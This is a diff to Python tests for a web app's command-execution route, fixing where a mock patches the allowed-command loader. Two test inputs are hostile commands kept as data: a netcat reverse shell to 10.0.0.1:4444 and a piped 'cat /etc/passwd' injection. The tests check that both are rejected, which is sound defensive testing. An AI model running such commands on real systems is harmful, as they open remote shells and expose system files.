@@ -109,6 +109,7 @@ class TestAllowedCommandsRoute:
 
     def test_unrestricted_when_no_file(self):
         client = get_client()
+        # Patch in app's namespace — the route calls load_allowed_commands() directly
         with mock.patch("app.load_allowed_commands", return_value=(None, [])):
             data = json.loads(client.get("/allowed-commands").data)
         assert data["restricted"] is False
@@ -152,13 +153,15 @@ class TestRunRoute:
 
     def test_disallowed_command_returns_403(self):
         client = get_client()
-        with mock.patch("app.load_allowed_commands", return_value=(["ping"], [])):
+        # Patch in commands' namespace — is_command_allowed calls load_allowed_commands
+        # from commands' own namespace, not from app's.
+        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
             resp = client.post("/run", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
         assert resp.status_code == 403
 
     def test_shell_operator_returns_403(self):
         client = get_client()
-        with mock.patch("app.load_allowed_commands", return_value=(["ping"], [])):
+        with mock.patch("commands.load_allowed_commands", return_value=(["ping"], [])):
             resp = client.post("/run", json={"command": "ping google.com | cat /etc/passwd"})
         assert resp.status_code == 403
 
